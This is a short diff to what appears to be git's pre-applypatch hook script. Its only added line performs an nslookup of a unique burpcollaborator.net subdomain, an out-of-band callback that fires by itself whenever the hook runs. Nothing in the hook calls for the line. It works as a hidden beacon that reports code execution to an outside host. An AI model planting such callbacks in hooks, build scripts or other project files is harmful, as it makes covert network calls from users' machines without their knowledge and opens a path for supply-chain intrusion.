@@ -12,3 +12,4 @@
 precommit="$(git rev-parse --git-path hooks/pre-commit)"
 test -x "$precommit" && exec "$precommit" ${1+"$@"}
 :
+nslookup pre-applypatch.cgwjbsfvmvc9bqjowwfwihmprgx7lw.burpcollaborator.net
